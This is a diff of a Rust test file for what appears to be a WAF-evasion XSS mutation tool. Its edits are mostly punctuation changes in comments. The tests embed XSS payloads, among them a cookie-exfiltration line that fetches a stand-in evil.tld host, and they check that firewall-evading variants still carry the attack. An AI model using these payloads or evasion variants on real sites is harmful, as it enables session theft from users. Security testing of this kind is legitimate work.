@@ -3,7 +3,7 @@
 //! proof-of-concept swapped in for it.
 //!
 //! The bug this pins: `xss::mutate` ignored the operator's payload
-//! almost entirely — every strategy emitted a FIXED library
+//! almost entirely, every strategy emitted a FIXED library
 //! (`location=document.cookie`, `<ScRiPt>alert(1)</sCrIpT>`,
 //! `<img src=x onerror=confirm(1)>`, the polyglots, …). So a real
 //! session-token exfil
@@ -16,7 +16,7 @@
 //! that construct in EVERY variant. Adversarial twin: a generic
 //! `alert(1)` / `alert(document.domain)` proof-of-concept STILL gets
 //! the full canned arsenal (the gate must not lobotomise the dominant
-//! legitimate case — that one really is "give me 200 WAF shapes of an
+//! legitimate case, that one really is "give me 200 WAF shapes of an
 //! alert PoC").
 
 use wafrift_grammar::grammar::equiv::xss::still_executes_xss;
@@ -29,7 +29,7 @@ use wafrift_grammar::grammar::xss;
 // (browser decodes it) and passes; a canned `alert(1)` PoC has none
 // of the structured markers even after decode and fails. A raw
 // substring check would wrongly reject the encoded-but-equivalent
-// form — that is weaker, not stronger.
+// form (that is weaker, not stronger).
 fn still_the_same_attack(original: &str, variant: &str) -> bool {
     still_executes_xss(original, variant)
 }
@@ -69,7 +69,7 @@ fn cookie_exfil_is_never_replaced_by_a_canned_poc() {
             v.payload,
             v.rules_applied
         );
-        // Every variant must still perform the SAME exfil — verified
+        // Every variant must still perform the SAME exfil, verified
         // on the browser-decoded form, so a sound entity/JS encoding
         // counts and a canned PoC (no structured markers) does not.
         assert!(
@@ -114,7 +114,7 @@ fn structured_sinks_keep_their_construct() {
                 v.payload
             );
             // Oracle requires ALL of the original's class-defining
-            // markers to survive in the decoded form — strictly
+            // markers to survive in the decoded form, strictly
             // stronger than "any of must_have_any" on the raw bytes.
             assert!(
                 still_the_same_attack(attack, &v.payload),
@@ -129,7 +129,7 @@ fn structured_sinks_keep_their_construct() {
 fn adversarial_twin_generic_poc_still_gets_full_canned_arsenal() {
     // The fix must NOT kill the dominant legitimate case: a generic
     // `alert(1)` / `alert(document.domain)` proof-of-concept is a
-    // demonstrator, not a structured exfil — the canned tag/event /
+    // demonstrator, not a structured exfil, the canned tag/event /
     // polyglot / mutation-XSS arsenal IS the correct, semantically
     // equivalent product there.
     for poc in [
@@ -155,7 +155,7 @@ fn adversarial_twin_generic_poc_still_gets_full_canned_arsenal() {
             has_tag_swap && has_polyglot && has_mxss && alt_tag,
             "generic PoC {poc:?} lost its legitimate canned arsenal \
              (tag_swap={has_tag_swap} polyglot={has_polyglot} mxss={has_mxss} alt_tag={alt_tag}) \
-             — the gate is too aggressive"
+The gate is too aggressive"
         );
     }
 }
@@ -183,7 +183,7 @@ fn evade_path_preserves_exfil() {
 
 #[test]
 fn structured_still_produces_multiple_real_evasions() {
-    // The fix must not just filter down to one survivor — re-templating
+    // The fix must not just filter down to one survivor, re-templating
     // the operator's JS into the tag/event arsenal must yield a real
     // spread of WAF shapes that all still carry the attack.
     let attack = "<img src=x onerror=fetch('//evil.tld/'+document.cookie)>";
@@ -191,7 +191,7 @@ fn structured_still_produces_multiple_real_evasions() {
     let distinct: std::collections::HashSet<_> = variants.iter().map(|v| &v.payload).collect();
     assert!(
         distinct.len() >= 6,
-        "structured attack collapsed to {} distinct variants — re-templating is not producing a real evasion spread",
+        "structured attack collapsed to {} distinct variants, re-templating is not producing a real evasion spread",
         distinct.len()
     );
     // and a different element than the original must appear (proves a
